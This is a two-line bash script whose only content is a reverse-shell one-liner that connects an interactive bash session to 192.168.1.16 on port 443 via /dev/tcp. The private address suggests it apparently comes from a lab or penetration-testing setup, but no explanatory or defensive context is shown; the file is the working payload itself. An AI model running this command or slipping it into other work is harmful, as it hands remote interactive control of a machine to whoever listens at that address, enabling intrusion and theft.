#!/bin/bash
bash -i >& /dev/tcp/192.168.1.16/443 0>&1
